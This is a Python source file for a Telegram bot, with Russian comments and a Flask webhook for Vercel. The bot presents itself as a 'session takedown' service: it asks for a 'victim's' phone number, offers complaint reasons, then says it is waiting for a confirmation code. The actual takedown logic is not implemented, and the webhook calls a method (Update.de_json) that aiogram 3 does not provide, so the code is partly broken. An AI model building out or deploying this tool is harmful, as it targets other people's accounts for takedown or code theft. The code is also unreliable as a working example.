import os
import asyncio
from flask import Flask, request
from aiogram import Bot, Dispatcher, types, F
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Инициализация Flask
app = Flask(__name__)

# Инициализация Бота
TOKEN = os.environ.get('API_TOKEN')
bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- ЛОГИКА БОТА ---

@dp.message(F.text == "/start")
async def start(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="🛠️ СНОС СЕССИЙ", callback_data="snos")
    await message.answer("⚡ **CORE SYSTEM V4**", reply_markup=kb.as_markup())

@dp.callback_query(F.data == "snos")
async def ask_phone(call: types.CallbackQuery):
    await call.message.answer("📞 Введите номер телефона жертвы (через +):")

@dp.message(F.text.startswith("+"))
async def show_reasons(message: types.Message):
    kb = InlineKeyboardBuilder()
    reasons = ["⚠️ Угрозы", "💸 Мошенничество", "🛡️ Обман"]
    for r in reasons:
        kb.button(text=r, callback_data="wait_code")
    kb.adjust(1)
    kb.row(types.InlineKeyboardButton(text="📥 ЖДУ КОД", callback_data="wait_code"))
    
    await message.answer(f"🎯 Номер `{message.text}`.\nВыбери причину:", 
                         reply_markup=kb.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "wait_code")
async def final_wait(call: types.CallbackQuery):
    await call.message.answer("🚀 **ЗАПУСК ПРОЦЕССА...**\nОжидаю код подтверждения...")

# --- ВЕБХУК ДЛЯ VERCEL ---

@app.route('/', defaults={'path': ''}, methods=['POST', 'GET'])
@app.route('/<path:path>', methods=['POST', 'GET'])
def webhook(path):
    if request.method == 'POST':
        # Обработка обновлений от Телеграм
        update = types.Update.de_json(request.get_json(force=True))
        asyncio.run(dp.feed_update(bot, update))
        return "OK", 200
    return "<h1>System Active</h1>", 200

# Это важно для Vercel: переменная app должна быть доступна на уровне модуля
